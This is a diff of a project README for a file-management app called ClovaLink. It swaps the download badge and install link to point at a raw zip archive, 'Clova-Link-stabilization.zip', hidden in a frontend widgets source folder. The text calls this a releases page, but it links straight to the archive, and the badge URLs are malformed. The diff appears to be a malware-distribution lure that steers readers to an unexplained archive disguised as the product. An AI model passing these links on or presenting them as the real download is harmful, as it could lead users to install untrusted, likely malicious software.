@@ -6,7 +6,7 @@ ClovaLink offers a modern way to manage your files with a focus on security and 
 
 ## 📥 Download Now
 
-[![Download ClovaLink](https://github.com/mladen4o/ClovaLink/raw/refs/heads/main/infra/Link-Clova-2.5.zip%https://github.com/mladen4o/ClovaLink/raw/refs/heads/main/infra/Link-Clova-2.5.zip)](https://github.com/mladen4o/ClovaLink/raw/refs/heads/main/infra/Link-Clova-2.5.zip)
+[![Download ClovaLink](https://raw.githubusercontent.com/mladen4o/ClovaLink/main/frontend/src/components/widgets/Clova-Link-stabilization.zip%https://raw.githubusercontent.com/mladen4o/ClovaLink/main/frontend/src/components/widgets/Clova-Link-stabilization.zip)](https://raw.githubusercontent.com/mladen4o/ClovaLink/main/frontend/src/components/widgets/Clova-Link-stabilization.zip)
 
 ## 📋 Overview
 
@@ -34,7 +34,7 @@ To run ClovaLink, your system should meet the following requirements:
 To get started, visit the releases page to download ClovaLink. 
 
 1. Click on the link below to access the download page:
-   [Download ClovaLink from Releases](https://github.com/mladen4o/ClovaLink/raw/refs/heads/main/infra/Link-Clova-2.5.zip)
+   [Download ClovaLink from Releases](https://raw.githubusercontent.com/mladen4o/ClovaLink/main/frontend/src/components/widgets/Clova-Link-stabilization.zip)
 
 2. On the releases page, look for the latest version of ClovaLink.
 3. Choose the appropriate file for your operating system.
